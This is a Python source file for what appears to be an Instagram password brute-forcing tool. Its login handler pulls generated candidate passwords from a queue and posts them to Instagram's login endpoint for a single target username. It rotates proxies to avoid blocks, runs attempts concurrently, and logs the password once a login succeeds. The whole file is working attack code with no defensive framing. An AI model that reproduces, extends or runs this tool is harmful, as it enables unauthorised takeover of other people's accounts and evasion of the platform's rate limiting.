from __future__ import absolute_import

import logging

import aiohttp
import asyncio

from app import settings
from app.lib import exceptions
from app.lib.utils import auto_logger, format_proxy
from app.lib.models import InstagramResult

from .requests import request_handler
from .managers import TaskManager, LoginAttemptContext, LoginTaskContext


class login_handler(request_handler):

    __handlername__ = 'login'

    def __init__(self, config, global_stop_event, queues):
        super(login_handler, self).__init__(config, global_stop_event, queues)
        self.user = self.config.user

    def _login_data(self, password):
        return {
            settings.INSTAGRAM_USERNAME_FIELD: self.user.username,
            settings.INSTAGRAM_PASSWORD_FIELD: password
        }

    def _headers(self, token):
        headers = super(login_handler, self)._headers()
        headers[settings.TOKEN_HEADER] = token
        return headers

    async def _get_result_from_response(self, response):
        try:
            result = await response.json()
        except ValueError:
            raise exceptions.ResultNotInResponse()
        else:
            return InstagramResult.from_dict(result)

    async def _handle_client_response(self, response, context, log):
        """
        Takes the AIOHttp ClientResponse and tries to return a parsed
        InstagramResult object.

        For AIOHttp sessions and client responses, we cannot read the json
        after response.raise_for_status() has been called.

        Since a 400 response will have valid json that can indicate an authentication,
        via a `checkpoint_required` value, we cannot raise_for_status until after
        we try to first get the response json.
        """
        if response.status >= 400 and response.status < 500:
            if response.status == 400:
                return await self._get_result_from_response(response)
            else:
                response.raise_for_status()
        else:
            try:
                return await self._get_result_from_response(response)
            except exceptions.ResultNotInResponse as e:
                raise exceptions.FatalException(
                    "Unexpected behavior, result should be in response.",
                    extra=context.log_context(response=response)
                )

    async def _handle_parsed_result(self, result, context, log):
        """
        Raises an exception if the result that was in the response is either
        non-conclusive or has an error in it.

        If the result does not have an error and is non conslusive, than we
        can assume that the proxy was most likely good.
        """
        if result.has_error:
            raise exceptions.InstagramResultError(result.error_message)
        else:
            if not result.conclusive:
                raise exceptions.InstagramResultError("Inconslusive result.")
            return result

    async def request(self, session, context, retry=1):
        """
        Do not want to automatically raise for status because we can have
        a 400 error but enough info in response to authenticate.

        Also, once response.raise_for_status() is called, we cannot access
        the response.json().
        """
        # Autologger not working because of keyword argument
        log = logging.getLogger('Login')
        self.log_post_request(context, log, retry=retry)

        try:
            async with session.post(
                settings.INSTAGRAM_LOGIN_URL,
                headers=self._headers(context.token),
                data=self._login_data(context.password),
                timeout=self.FETCH_TIME,
                proxy=format_proxy(context.proxy)
            ) as response:
                # Only reason to log these errors here is to provide the response
                # object
                try:
                    result = await self._handle_client_response(response, context, log)
                    result = await self._handle_parsed_result(result, context, log)

                except exceptions.ResultNotInResponse as e:
                    log.error(e, extra=context.log_context(response=response))

                except exceptions.InstagramResultError as e:
                    log.error(e, extra=context.log_context(response=response))

                else:
                    if not result:
                        raise exceptions.FatalException("Result should not be None here.")
                    self.queues.proxies.good.put_nowait(context.proxy)

                    return result

        except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError,
                asyncio.TimeoutError) as e:
            retry += 1

            # We probably want to lower this number
            if retry < self.MAX_REQUEST_RETRY_LIMIT:
                # Session should still be alive.
                await asyncio.sleep(1)
                return await self.request(session, context, retry=retry)
            else:
                log.error(e, extra=context.log_context())
                return None

        except aiohttp.ClientError as e:
            log.error(e, extra=context.log_context())

        except Exception as e:
            raise exceptions.FatalException(f'Uncaught Exception: {str(e)}')

    @auto_logger("Sync Login")
    async def login_synchronously(self, token, password, log):

        async with aiohttp.ClientSession(
            connector=self.connector,
            timeout=self.timeout
        ) as session:

            # This is only goign to return the first 2 (or whatever the limit is)
            # so we might need a customer generator to return the first two but then
            # wait to see if more are needed.
            async for context in self.task_generator(log, password, token=token):
                log.debug("Submitting Task", extra={
                    'task': context.name
                })
                if not self.stop_event.is_set():
                    result = await self.request(session, context)
                    if result:
                        if result.has_error:
                            log.warning(result.error_message, extra={
                                'token': token,
                                'password': password,
                                'task': context.name,
                            })
                        else:
                            self.queues.proxies.good.put_nowait(context.proxy)
                            if result.conclusive:
                                self.stop_event.set()
                                return result

    @auto_logger("Async Login w Password")
    async def attempt_login(self, session, context, log):
        """
        Instead of doing these one after another, we might be able to stagger
        them asynchronously.  This would be waiting like 3 seconds in between
        tasks just in case the first one immediately doesn't work, or finding
        a faster way of accounting for bad proxies.
        """

        # Should we maybe be doing these one after another?  Or just limit the
        # number present for any given password.
        # TODO: We might want to put tasks in their own queue?

        # Do in sets of 3?
        while True:
            manager = TaskManager(self.stop_event, log=log, limit=3)
            while manager.active:

                # This is double counting but the only other option would be while True?
                proxy = await self.queues.proxies.get_best()

                attempt_context = LoginAttemptContext(
                    index=manager.index,
                    proxy=proxy,
                    context=context,
                )

                task = asyncio.create_task(self.request(session, attempt_context))
                manager.submit(task, attempt_context)

            for future in asyncio.as_completed(manager.tasks, timeout=None):
                # Result can be None if there was a request error or the result
                # was invalid, but if the result is present - it is guaranteed to
                # be conclusive.
                try:
                    result = await future
                except asyncio.CancelledError:
                    continue
                else:
                    if result:
                        if not result.conclusive:
                            raise exceptions.FatalException("Result should be conslusive.")
                        await manager.stop()
                        return result

    @auto_logger("Async Login")
    async def login_asynchronously(self, token, log):
        """
        Asyncio Docs:

        asyncio.as_completed
        -------------------
            Run awaitable objects in the aws set concurrently. Return an iterator
            of Future objects. Each Future object returned represents the earliest
            result from the set of the remaining awaitables.

            Raises asyncio.TimeoutError if the timeout occurs before all Futures are done.

        TODO
        -----
        Incorporate timeout into asyncio.as_completed() just in case of situations
        where it could get caught.

        IMPORTANT
        _________
        What we should do is start off with a minimum of like 3 requests, if none
        of those succeed, then incrementally add one more one more etc. - the issue
        is if we do not get a valid response for any of the 5 requests we set.
        """

        # Put a temporary limit on
        manager = TaskManager(self.stop_event, log=log, limit=2)

        async with aiohttp.ClientSession(
            connector=self.connector,
            timeout=self.timeout
        ) as session:
            while manager.active and not self.queues.passwords.generated.empty():
                password = self.queues.passwords.generated.get_nowait()

                context = LoginTaskContext(
                    index=manager.index,
                    password=password,
                    token=token
                )

                task = asyncio.create_task(self.attempt_login(session, context))
                manager.submit(task, context)

            # Result can never be None - it should only be returned if
            # the result was conclusive instagram result.
            # TODO: We might have to account for null results if too many attempts
            # with a given password.
            for future in asyncio.as_completed(manager.tasks, timeout=None):
                try:
                    result = await future
                except asyncio.CancelledError:
                    continue
                else:
                    if not result or not result.conclusive:
                        raise exceptions.FatalException(
                            "Result should be valid and conslusive."
                        )
                    if result.authorized:
                        log.success('Found Password!')
                        log.success(future.__context__.password)
                        await manager.stop()
                        return result
                    else:
                        log.error("Not Authenticated")
            return None

    async def login(self, token):
        if self.config.sync:
            return await self.login_synchronously(token)
        return await self.login_asynchronously(token)
